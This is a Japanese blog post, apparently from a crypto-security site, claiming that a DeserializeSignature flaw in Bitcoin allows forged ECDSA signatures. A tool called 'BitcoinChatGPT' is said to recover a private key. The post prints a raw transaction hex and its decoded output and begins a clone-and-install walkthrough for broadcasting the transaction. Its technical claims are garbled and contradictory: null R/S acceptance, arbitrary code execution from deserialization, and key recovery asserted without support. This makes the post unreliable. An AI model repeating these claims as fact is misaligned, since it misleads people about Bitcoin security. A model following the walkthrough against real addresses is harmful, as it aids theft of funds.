# ビットコインネットワークにおける DeserializeSignature の脆弱性 暗号解析、その結果、無効な ECDSA 署名が作成される可能性

<!-- wp:image {"id":5188} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/053-2-1024x576.png" alt="ビットコインネットワークにおける DeserializeSignature の脆弱性: 暗号解析、その結果、無効な ECDSA 署名が作成される可能性" class="wp-image-5188"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>この調査では、攻撃者がビットコイン ネットワーク上で無効な ECDSA 署名を作成できるようにする DeserializeSignature の脆弱性を調べます。暗号化において、ECDSA デジタル署名は、デジタル メッセージまたはドキュメントの信頼性を証明できる数学的スキームです。ビットコイン ネットワークでは、署名を使用して取引を承認し、一定量のビットコインの所有者が実際にその送金に同意していることを確認します。ただし、&nbsp;<a href="https://attacksafe.ru/bip-schnorrrb"><em>2023 年に発見された</em></a>関数の脆弱性により<code>DeserializeSignature</code>、攻撃者はネットワークによって有効なものとして受け入れられる無効な署名を作成することができました。<a href="https://attacksafe.ru/bip-schnorrrb"><em></em></a></p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">DeserializeSignature の仕組み</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>DeserializeSignature 関数は、デジタル署名をその有効性のチェックに使用できるオブジェクトに逆シリアル化 (一連のバイトから変換) する役割を果たします。この関数は、ビットコインで使用される公開キー暗号化標準 (ECDSA) に準拠した特定のデータ形式を想定しています。 DeserializeSignature 関数はトランザクション署名を取得し、計算の結果得られたハッシュとの整合性をチェックします。署名が有効な場合、DeserializeSignature は を返し<code>true</code>、それ以外の場合は を返します<code>false</code>。この脆弱性の本質は、DeserializeSignature がデシリアライズ前にすべての署名パラメータの正確性をチェックしなかったことです。特に、関数は署名の「R」または「S」値が null かどうかをチェックしませんでした。これにより、攻撃者は null 値を含む署名を作成することができ、無効であるにもかかわらず、一部のビットコイン クライアントによって正しいものとして受け入れられる可能性がありました。攻撃者は、不正なデータを含む DeserializeSignature 関数に渡された場合に有効なものとして受け入れられる偽のトランザクション署名を作成する可能性があります。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">潜在的な脅威と攻撃例</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>この脆弱性は、ビットコイン ネットワークのセキュリティに重大な脅威をもたらしました。攻撃者はこれを次の目的で使用する可能性があります。</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><!-- wp:list-item -->
<li><strong>ビットコインの盗難:</strong> 攻撃者は無効な署名を作成することで、他人のウォレットから自分のウォレットにビットコインを転送するトランザクションを承認する可能性があります。</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>二重支払い:</strong>  null 値の署名を使用すると、同じビットコインで 2 つの異なるトランザクションを作成することができます。</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>ブロックチェーン内のデータの操作:</strong>攻撃者は、署名が正しいものとして受け入れられる偽のトランザクションを作成し、それをブロックチェーンに追加する可能性があります。これにより、口座残高が変化する可能性があります。</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>トランザクション確認システムへの攻撃:</strong>攻撃者は偽のトランザクション署名を作成し、確認のためにネットワークに送信する可能性があります。</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">DeserializeSignature プロセス</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>DeserializeSignature は、一連のバイトを、トランザクションの認証に使用できるデータ構造に変換するプロセスです。ビットコインのコンテキストでは、署名は ECDSA (楕円曲線デジタル署名アルゴリズム) アルゴリズムを使用して作成され、r と s の 2 つのコンポーネントが含まれます。暗号通貨のコンテキストでは、署名はトランザクションの信頼性を確認し、完全性を保証するために使用されます。 DeserializeSignature の脆弱性は、攻撃者が逆シリアル化プロセスを操作して署名データを変更または偽造できる場合に発生します。</p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph {"align":"center"} -->
<p class="has-text-align-center"><iframe width="560" height="315" src="https://www.youtube.com/embed/8E2KJeWu4XA?si=bhCMFNyyxcXGNiTd" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen=""></iframe></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">逆シリアル化の手順:</h3>
<!-- /wp:heading -->

<!-- wp:list {"ordered":true} -->
<ol><!-- wp:list-item -->
<li>データの読み取り: 最初のステップは、署名を表す一連のバイトを読み取ることです。通常、このデータは DER (Distinguished Encoding Rules) 形式で保存されます。</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>フォーマットチェック: バイトシーケンスが予期される DER フォーマットと一致するかどうかをチェックします。これには、データの長さと構造のチェックが含まれます。</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>コンポーネントの抽出: r コンポーネントと s コンポーネントがバイト シーケンスから抽出されます。これらのコンポーネントは、署名を検証するために使用される整数です。</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>値の検証: r と s の値が許容範囲内であるかどうかをチェックします。これは署名偽造攻撃を防ぐために重要です。</li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">潜在的な障害点</h2>
<!-- /wp:heading -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong>DeserializeSignature</strong>プロセスは、さまざまな攻撃やバグに対して脆弱になる可能性があります。潜在的な主な障害点を見てみましょう。</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">1. 不正なフォーマットチェック</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>DER 形式の検証が正しく実行されない場合、無効な署名が有効であるとみなされる可能性があります。これにより、攻撃者が署名を偽造し、不正な取引を行う可能性があります。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">2. ライブラリの脆弱性</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>脆弱な逆シリアル化ライブラリを使用すると、バッファ オーバーフローや任意のコードの実行など、さまざまな攻撃が発生する可能性があります。シグネチャを操作するには、テストされ更新されたライブラリを使用することが重要です。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">3. 値のチェックが不十分</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>r 値と s 値が適切に検証されていない場合、攻撃者が誤った値を使用して偽造署名を作成する可能性があります。たとえば、r と s の値は 1 と n-1 の間でなければなりません。n は楕円曲線の次数です。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">4. ランタイム攻撃</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>一部の攻撃は、逆シリアル化操作の実行時間の分析に基づいている場合があります。実行時間が r と s の値に依存する場合、攻撃者が秘密鍵に関する情報を取得できる可能性があります。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>次に、ビットコイン システムの DeserializeSignature プロセスの脆弱性に関する研究結果を見ていき、また、脆弱性の背後にあるメカニズム、その潜在的な影響、および提案された緩和策についても見ていきます。</p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">暗号通貨のセキュリティへの影響</h2>
<!-- /wp:heading -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong>DeserializeSignature の</strong>脆弱性は、次のような理由から暗号通貨のセキュリティに深刻な脅威をもたらします。</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:list {"ordered":true} -->
<ol><!-- wp:list-item -->
<li>資金の損失: 攻撃者はこの脆弱性を利用して、ユーザーのウォレットから資金を盗む可能性があります。</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>信頼を損なう: 攻撃が成功すると、暗号通貨のセキュリティに対するユーザーの信頼が損なわれ、暗号通貨の導入と使用に悪影響を及ぼす可能性があります。</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>検出が困難: DeserializeSignature の脆弱性を悪用した攻撃は、検出と防止が困難なため、特に危険です。</li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">DeserializeSignature の脆弱性から保護する方法</h2>
<!-- /wp:heading -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong>DeserializeSignature の</strong>脆弱性から保護するには、次の措置を講じる必要があります。</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:list {"ordered":true} -->
<ol><!-- wp:list-item -->
<li>データ検証: 改ざんを防ぐために、逆シリアル化フェーズ中に厳密なデータ チェックを実装します。</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>ソフトウェアのアップデート: 暗号通貨システムとウォレットを定期的にアップデートして、既知の脆弱性を排除します。</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>セキュリティ監査: 定期的なセキュリティ監査を実施して、潜在的な脆弱性を特定して対処します。</li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">研究の主な目的</h2>
<!-- /wp:heading -->

<!-- wp:list {"ordered":true} -->
<ol><!-- wp:list-item -->
<li>脆弱性の特定: 攻撃に対して脆弱である可能性のある DeserializeSignature プロセスの特定の側面を特定します。</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>脆弱性分析: 特定された脆弱性がビットコイン ネットワークのセキュリティに及ぼす潜在的な影響を評価します。</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>既存のセキュリティ方法のレビュー: DeserializeSignature プロセスを保護するために使用されている現在の方法とアプローチを調べます。</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>推奨事項の作成: セキュリティを向上させ、攻撃の可能性を防ぐための対策を提案します。</li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">方法論と脆弱性の特定</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>ビットコインの DeserializeSignature プロセスには、ある形式から別の形式へのデータの変換が含まれます。このプロセス中に、攻撃者が攻撃を開始するために使用できるエラーが発生する可能性があります。この段階の主なタスクは、逆シリアル化プロセスにおける特定の脆弱性を特定することです。脆弱性の暗号解析: 脆弱性を特定した後、その詳細な分析を実行する必要があります。これには、ビットコイン ネットワークのセキュリティに対する潜在的な影響の評価や、考えられる攻撃シナリオの調査が含まれます。攻撃者が独自の目的でこの脆弱性をどのように悪用するかを理解することが重要です。既存のセキュリティ方法のレビュー: 調査のこの段階では、DeserializeSignature プロセスを保護するために使用されている現在の方法とアプローチをレビューします。これにより、既存の対策がどの程度効果的であるか、どの対策を改善できるかを判断できます。</p>
<!-- /wp:paragraph -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p>特定された脆弱性を排除するために、いくつかの対策が提案されています。</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:list {"ordered":true} -->
<ol><!-- wp:list-item -->
<li>更新された逆シリアル化アルゴリズム: DeserializeSignature 段階でのより厳格なチェックとデータ検証の実装。</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>テストレベルの向上: さまざまな攻撃シナリオを使用して定期的なセキュリティテストを実施します。</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>開発者教育: 潜在的な脆弱性とそれを防ぐ方法についての開発者の認識を高めます。</li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>ビットコインで使用されている楕円曲線デジタル署名アルゴリズム (ECDSA) の脆弱性に関するこれまでの研究が行われています。これらの研究は、ECDSA の不適切な実装が秘密キーの漏洩につながる可能性があることを示しています。</p>
<!-- /wp:paragraph -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong>DeserializeSignature の</strong>脆弱性とは異なり、ECDSA の問題はデータ処理プロセスではなく、アルゴリズムの数学的側面に関連しています。他の研究では、ピアツーピア (P2P) ビットコイン ネットワークの脆弱性に焦点を当てています。これらの脆弱性には、<strong>二重支払い</strong>や<strong>シビル攻撃が</strong>含まれます。<strong>DeserializeSignature の</strong>脆弱性とは異なり、これらの問題はネットワークの側面とネットワーク上のノードの相互作用に関連しており、暗号化データの処理には関連していません。</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:paragraph -->
<p>DeserializeSignature の脆弱性と以前の研究の主な違いは、問題の性質です。 DeserializeSignature の脆弱性はデータ処理の脆弱性であり、データの逆シリアル化と検証の技術を改善することで解決できます。一方、ECDSA および P2P ネットワークの脆弱性には、アルゴリズムとネットワーク プロトコルの大幅な変更が必要です。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>さらに、DeserializeSignature の脆弱性は、任意のコードを実行してシステムを侵害するために使用される可能性があるため、ユーザーのセキュリティに対してより直接的な影響を及ぼします。一方、ECDSA および P2P ネットワークの脆弱性は、より複雑な攻撃を必要とし、より間接的な影響を与える可能性があります。近年、ビットコインなどの暗号通貨は金融エコシステムの重要な部分となっています。ただし、その人気が高まるにつれて、特定される脆弱性の数も増加します。</p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">偽の ECDSA 署名</h2>
<!-- /wp:heading -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">BitcoinChatGPT 機械学習プロセスを使用した無効な ECDSA 署名の生成</h3>
<!-- /wp:heading -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong><a href="https://bitcoinchatgpt.org/deserializesignature-vulnerability-algorithm/" target="_blank" rel="noreferrer noopener">BitcoinChatGPT</a></strong>モジュール&nbsp;を使用する&nbsp;脆弱な<strong><a href="https://en.bitcoin.it/wiki/Raw_transactions">Raw</a></strong>トランザクションの構造の構築を検討してみましょう&nbsp;</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:paragraph {"align":"center"} -->
<p class="has-text-align-center"><iframe width="560" height="315" src="https://www.youtube.com/embed/i0qchOojI0g?si=uVXaIQiEUrKApLd5" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen=""></iframe></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong>Google Colab バージョンを開いてみましょう。</strong></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:paragraph -->
<p><a href="https://colab.research.google.com/drive/1-3WyUqipb1pXrlDjg4jxtMOG6J3MU3sa#scrollTo=B8ueObMAt5Q9&amp;line=1&amp;uniqifier=1">https://colab.research.google.com/drive/1-3WyUqipb1pXrlDjg4jxtMOG6J3MU3sa#scrollTo=B8ueObMAt5Q9&amp;line=1&amp;uniqifier=1</a></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>State of a vulnerable transaction in Bitcoin:

01000000
....01
........0dbc696374c8d7ca61f32710e03aaedcb7a4f2428074814d0e1f4f7f5c1e5935
............00000000
........8b483045
....0221
....00
........b44a31bd81d3c596cc4d3776263229b6f52f2a729fbcafefffc9a0d955d46307
....0220
........74e5feb333400732256fc44a681a1ba262b080a7cc5dfa11894e7ce4d9766c6f
....0141
045cf7dd1ad49af6957415d6b76ff39cbf78f6e72f1db9199a01127687e7230f96614ff6f0184d2191fa7428872e311fe4ddf2b91f560b30fd7dc01d2118ac0b5b
....ffffffff
01
....d204000000000000
........1976
............a914
........d74b32dfa340da479ce64aaf5e326496eb3995f1
....88ac
00000000</strong></code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong>すべての出力値を 1 つの共通の行に結合しましょう。</strong></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>01000000010dbc696374c8d7ca61f32710e03aaedcb7a4f2428074814d0e1f4f7f5c1e5935000000008b483045022100b44a31bd81d3c596cc4d3776263229b6f52f2a729fbcafefffc9a0d955d46307022074e5feb333400732256fc44a681a1ba262b080a7cc5dfa11894e7ce4d9766c6f0141045cf7dd1ad49af6957415d6b76ff39cbf78f6e72f1db9199a01127687e7230f96614ff6f0184d2191fa7428872e311fe4ddf2b91f560b30fd7dc01d2118ac0b5bffffffff01d2040000000000001976a914d74b32dfa340da479ce64aaf5e326496eb3995f188ac00000000</strong></code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong></strong><strong><a href="https://live.blockcypher.com/btc/decodetx" target="_blank" rel="noreferrer noopener">BlockCypher の「Decode A Transaction」</a></strong><strong>オプションを開いてみましょう</strong><em>。</em><em>&nbsp;</em><strong><a href="https://live.blockcypher.com/btc/decodetx" target="_blank" rel="noreferrer noopener"></a></strong><em></em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:paragraph -->
<p><a href="https://live.blockcypher.com/btc/decodetx">https://live.blockcypher.com/btc/decodetx</a></p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":5108} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-1024x505.png" alt="ビットコインネットワークにおける DeserializeSignature の脆弱性: 暗号解析、その結果、無効な ECDSA 署名が作成される可能性" class="wp-image-5108"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong>脆弱な Raw Bitcoin トランザクションをデコードすると、次の結果が得られます。</strong></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>{
    "addresses": &#91;
        "1QiERrMcv6mtGk4F1TVz4sRp9dFfXTQpK",
        "1LdNN9GXmoKZs5vrQFL1d4NL9GgZ1PfCZk"
    ],
    "block_height": -1,
    "block_index": -1,
    "confirmations": 0,
    "double_spend": false,
    "fees": 2606688996428,
    "hash": "32361b5b8aa2954519c171b45dfa14ee5d997dc0a89182ebea4a9eaa15429f1e",
    "inputs": &#91;
        {
            "addresses": &#91;
                "1QiERrMcv6mtGk4F1TVz4sRp9dFfXTQpK"
            ],
            "age": 344419,
            "output_index": 0,
            "output_value": 2606688997662,
            "prev_hash": "35591e5c7f4f1f0e4d81748042f2a4b7dcae3ae01027f361cad7c8746369bc0d"
.......
.......
.......</strong></code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em>ビットコイン HASH160 に注目してみましょう:&nbsp;&nbsp;</em><strong>d74b32dfa340da479ce64aaf5e326496eb3995f1</strong></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:image {"id":5112} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-1.png" alt="ビットコインネットワークにおける DeserializeSignature の脆弱性: 暗号解析、その結果、無効な ECDSA 署名が作成される可能性" class="wp-image-5112"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/CryptoDeepTools/blob/f0421962be80403bb1b0877eace2c7eb70eb85bd/32DeserializeSignatureVulnerability/DecodeRawTX.txt#L31">https://github.com/demining/CryptoDeepTools/blob/f0421962be80403bb1b0877eace2c7eb70eb85bd/32DeserializeSignatureVulnerability/DecodeRawTX.txt#L31</a></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><code><strong>HASH</strong></code>BitcoinChatGPT は公開キーを使用してトランザクション構造を作成します。ここで、ビットコイン アドレス<a href="https://live.blockcypher.com/btc/address/1LdNN9GXmoKZs5vrQFL1d4NL9GgZ1PfCZk/" target="_blank" rel="noreferrer noopener">1LdNN9GXmoKZs5vrQFL1d4NL9GgZ1PfCZk</a><strong><code>1234 satoshi</code></strong>がネットワーク内の同じアドレスに送信されることがわかります。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><a href="https://live.blockcypher.com/widget/btc/1LdNN9GXmoKZs5vrQFL1d4NL9GgZ1PfCZk/received">https://live.blockcypher.com/widget/btc/1LdNN9GXmoKZs5vrQFL1d4NL9GgZ1PfCZk/received</a></p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":5116} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-2-1024x367.png" alt="ビットコインネットワークにおける DeserializeSignature の脆弱性: 暗号解析、その結果、無効な ECDSA 署名が作成される可能性" class="wp-image-5116"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>ビットコイン HASH160 は、Python スクリプト<a href="https://github.com/demining/CryptoDeepTools/blob/main/32DeserializeSignatureVulnerability/wif_to_hash160.py" target="_blank" rel="noreferrer noopener"><strong>wif_to_hash160.pyを使用して取得されました。</strong></a></p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":5117} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-3.png" alt="ビットコインネットワークにおける DeserializeSignature の脆弱性: 暗号解析、その結果、無効な ECDSA 署名が作成される可能性" class="wp-image-5117"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/CryptoDeepTools/blob/main/32DeserializeSignatureVulnerability/VulnerableRawTX.txt" target="_blank" rel="noreferrer noopener"><strong>脆弱なRawTX.txt</strong></a></p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":5118} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-4-1024x689.png" alt="ビットコインネットワークにおける DeserializeSignature の脆弱性: 暗号解析、その結果、無効な ECDSA 署名が作成される可能性" class="wp-image-5118"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/CryptoDeepTools/blob/main/32DeserializeSignatureVulnerability/wif_to_hash160.py">https://github.com/demining/CryptoDeepTools/blob/main/32DeserializeSignatureVulnerability/wif_to_hash160.py</a></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong>質疑応答：</strong></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:image {"id":5119} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-5-1024x456.png" alt="ビットコインネットワークにおける DeserializeSignature の脆弱性: 暗号解析、その結果、無効な ECDSA 署名が作成される可能性" class="wp-image-5119"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":5120} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-6-1024x351.png" alt="ビットコインネットワークにおける DeserializeSignature の脆弱性: 暗号解析、その結果、無効な ECDSA 署名が作成される可能性" class="wp-image-5120"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":5121} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-7-1024x430.png" alt="ビットコインネットワークにおける DeserializeSignature の脆弱性: 暗号解析、その結果、無効な ECDSA 署名が作成される可能性" class="wp-image-5121"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":5122} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-8-1024x275.png" alt="ビットコインネットワークにおける DeserializeSignature の脆弱性: 暗号解析、その結果、無効な ECDSA 署名が作成される可能性" class="wp-image-5122"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p>最終的に、<strong>BitcoinChatGPT</strong>モジュールはファイル<strong>KEYFOUND.privkeyに応答を出力し、最もよく使用される 2 つの形式</strong><strong>HEX および WIF</strong>で秘密キーを保存します。<strong></strong></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:image {"id":5123} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-9-1024x677.png" alt="ビットコインネットワークにおける DeserializeSignature の脆弱性: 暗号解析、その結果、無効な ECDSA 署名が作成される可能性" class="wp-image-5123"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/CryptoDeepTools/blob/main/32DeserializeSignatureVulnerability/KEYFOUND.privkey">https://github.com/demining/CryptoDeepTools/blob/main/32DeserializeSignatureVulnerability/KEYFOUND.privkey</a></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading"><a href="https://youtu.be/NNFv08QlDZk" target="_blank" rel="noreferrer noopener">BitcoinChatGPT #2 DeserializeSignature 脆弱性アルゴリズム</a></h2>
<!-- /wp:heading -->

<!-- wp:paragraph {"align":"center"} -->
<p class="has-text-align-center"><iframe width="560" height="315" src="https://www.youtube.com/embed/NNFv08QlDZk?si=kzowhQ7vBYKwlViE" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen=""></iframe></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:heading -->
<h2 class="wp-block-heading">実践編</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><strong><a href="https://github.com/smartiden/Broadcast-Bitcoin-Transaction" target="_blank" rel="noreferrer noopener">実践的な部分に進むために、ブロードキャスト ビットコイン トランザクション</a></strong>リポジトリを使用して、受信したデータから脆弱な<strong>Rawトランザクションを作成しましょう</strong><strong><a href="https://github.com/smartiden/Broadcast-Bitcoin-Transaction" target="_blank" rel="noreferrer noopener"></a></strong></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p>ソース コードをダウンロードしてインストールし、ターミナルを開いてコマンドを実行します。</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>git clone https://github.com/smartiden/Broadcast-Bitcoin-Transaction.git
</strong></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>カタログ：</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>cd Broadcast-Bitcoin-Transaction</strong></code></pre>
<!-- /wp:code -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p>3 つの重要なライブラリをインストールしましょう。</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:list -->
<ul><!-- wp:list-item -->
<li><a href="https://pypi.org/project/zmq/" target="_blank" rel="noreferrer noopener"><strong>zmq</strong></a></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><a href="https://pypi.org/project/urllib3/" target="_blank" rel="noreferrer noopener"><strong>URLlib3</strong></a></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><a href="https://pypi.org/project/requests/" target="_blank" rel="noreferrer noopener"><strong>リクエスト</strong></a></li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

